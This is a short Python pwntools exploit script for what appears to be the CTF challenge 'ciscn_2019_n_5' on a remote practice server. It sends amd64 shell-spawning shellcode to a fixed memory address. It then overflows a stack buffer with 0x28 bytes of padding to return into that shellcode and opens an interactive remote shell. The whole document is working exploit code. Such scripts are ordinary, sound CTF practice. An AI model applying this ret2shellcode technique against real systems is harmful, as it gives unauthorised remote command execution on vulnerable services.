from pwn import *
context(log_level='DEBUG')
context(arch='amd64',os='linux')
#io = process("./ciscn_2019_n_5")
io = remote('node3.buuoj.cn',28410)
io.recv()
payload_add = 0x0601080
payload = asm(shellcraft.sh()) 
io.send(payload)
io.recv()
payload = 'a'*0x28+p64(payload_add)
io.sendline(payload)
io.interactive()